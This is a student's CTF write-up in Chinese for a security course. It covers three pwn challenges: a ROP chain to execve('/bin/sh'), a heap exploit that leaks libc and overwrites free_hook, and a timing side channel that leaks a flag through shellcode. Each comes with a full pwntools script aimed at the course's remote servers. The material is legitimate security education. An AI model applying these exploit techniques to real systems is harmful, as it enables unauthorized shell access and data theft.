# Pwn writeup

Done: Yes
Due date: December 9, 2022
Subject: 計算機安全

## ROP++

這題給的空間夠大可以直接執行 ROP 指令，先算出 BOF offset 為 40 然後開始找 ROP gadgets。這邊遇到最大的問題是沒有 **”/bin/sh**” 這個 string 讓我們傳入 execv 執行。所以我們只能找個記憶體空間把它寫入。可以用 **vmmap** 找出可讀寫區域，像下面可以看到 **0x4c5000** 是可以寫入的。

```python
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /root/NTUctf/Pwn/rop++/share/chal
          0x401000           0x498000 r-xp    97000   1000 /root/NTUctf/Pwn/rop++/share/chal
          0x401000           0x4c1000 r-xp    c0000      0 <explored>
          0x498000           0x4c1000 r--p    29000  98000 /root/NTUctf/Pwn/rop++/share/chal
          0x4c1000           0x4c5000 r--p     4000  c0000 /root/NTUctf/Pwn/rop++/share/chal
          0x4c5000           0x4c8000 rw-p     3000  c4000 /root/NTUctf/Pwn/rop++/share/chal
          0x4c8000           0x4cd000 rw-p     5000      0 [anon_004c8]
         0x11f9000          0x121b000 rw-p    22000      0 [heap]
    0x7ffe223f0000     0x7ffe22411000 rw-p    21000      0 [stack]
    0x7ffe2246c000     0x7ffe22470000 r--p     4000      0 [vvar]
    0x7ffe22470000     0x7ffe22472000 r-xp     2000      0 [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

利用 **mov qword ptr [rax + 8], rdx ; ret** 這個 gadget 可以把我們要的 string 寫入 mem，最後用 ROP 組成 shell code 即可得到 shell 找到 flag。

### Code

```python
# ref: https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-syscall-execv
from pwn import *

ip = 'edu-ctf.zoolab.org' 
port = 10003

#s = process('./chal')
s = remote(ip,port)
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

mem_addr = 0x4c5000
write_mem = 0x449c13 # mov qword ptr [rax + 8], rdx ; ret

pop_rdi = 0x401e3f # pop rdi ; ret
pop_rsi = 0x409e6e # pop rsi ; ret
pop_rdx = 0x47ed0b # pop rdx ; pop rbx ; ret
pop_rax = 0x447b27 # pop rax ; ret
syscall = 0x414506 # syscall ; ret

ROP = flat(
    #Write '/bin/sh' into 0x4c5000 + 0x8
    pop_rdx, '/bin/sh\x00', 0,
    pop_rax, mem_addr,
    write_mem,

    #execv('bin/sh',0,0)
    pop_rax, 0x3b,
    pop_rdi, mem_addr+0x8,
    pop_rsi, 0,
    pop_rdx, 0, 0, 
    syscall,
)
#gdb.attach(s)
s.sendafter(b"> ",b'A'*40 + ROP)
s.interactive()
```

## Babyums

這題跟 babynote 相似，先把 heap 構建起來， del user 完後即可 leak **Unsorted bin fd** address，再從 gdb 找到 libc address 後相減可得 offset。最後觀察 heap 架構填入對應的 free_hook 和 overflow chunk，delete(1) 即可得到 shell

**FLAG1 在 source code 中是大寫，但實際答案是小寫**

```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
ip = 'edu-ctf.zoolab.org'
port = 10008
local = False

def add_user(idx,name,passwd):
    s.sendlineafter(b'>','1')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(name))
    s.sendlineafter(b'>',str(passwd))
    #print(s.recvuntil(b'1. ')[:-3])

def edit_data(idx,size,data):
    s.sendlineafter(b'>','2')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(size))
    s.send(data)
    #print(s.recvuntil(b'1. ')[:-3])

def del_user(idx):
    s.sendlineafter(b'>','3')
    s.sendlineafter(b'>',str(idx))
def show_users():
    s.sendlineafter(b'>','4')
    return s.recvuntil(b'1. ')[:-3]

if local :
    s = process('./chal')
else:
    s = remote(ip,port)

edit_data(0,0x418,'admin')
add_user(1,'AAAAAAAA','aaaaaaaa')
edit_data(1,0x18,'AaAa')
add_user(2,'BBBBBBBB','bbbbbbbb')
del_user(0)

leak_data = show_users()
leak_addr = leak_data.split(b'\n')[1][6:12]
leak_addr = u64(leak_addr.ljust(8,b'\x00'))
print("leaked addr:",hex(leak_addr))

libc = leak_addr - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290

fake_chunk = flat(
    0          ,       0x31,
    b'CCCCCCCC',b'CCCCCCCC',
    b'CCCCCCCC',b'CCCCCCCC',
    free_hook,
)
data = b'/bin/sh\x00'.ljust(0x10,b'B')
edit_data(1,0x50,data+fake_chunk)
edit_data(2,0x8,p64(system))
#gdb.attach(s)
del_user(1)
s.interactive()
```

## how2know

這題很像某個 ctf 題目 **no-syscall-allowed** (連結在下方 code 中) 透過 reuturn 的時間一個 bit 一個 bit 把 flag leak 出來，觀察後得知 stack 中 rbp 跟存 main 地址的相對位置不變，為 0x18，然後 main 對全域變數 FLAG 的相對位置也是不變的(0x2db7)，所以我們先把 main 位置讀出來，再加上 0x2db7 後即可得到 FLAG 位置。最後用 no-syscall-allowed 提供的 code 把 flag leak 出來。

```python
#ref https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/UIUCTF22/no-syscalls-allowed.c
from pwn import *
ip = 'edu-ctf.zoolab.org' 
port = 10002
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

def get_a_byte(reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(start_of_code_bit(reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

def start_of_code_bit(reg_offset, bit, local):
    if local == 1:
        target = process('./chal')
    else:
        target = remote(ip,port)
    payload = asm('''
    mov rbx, QWORD PTR ds:[rbp+0x18];
    add rbx, 0x2db7;
    mov al, BYTE PTR ds:[rbx+''' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +
    ''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

flag = ''
for i in range(50):
    byte = (get_a_byte(i, 0))
    flag += chr(byte)
print(flag)
```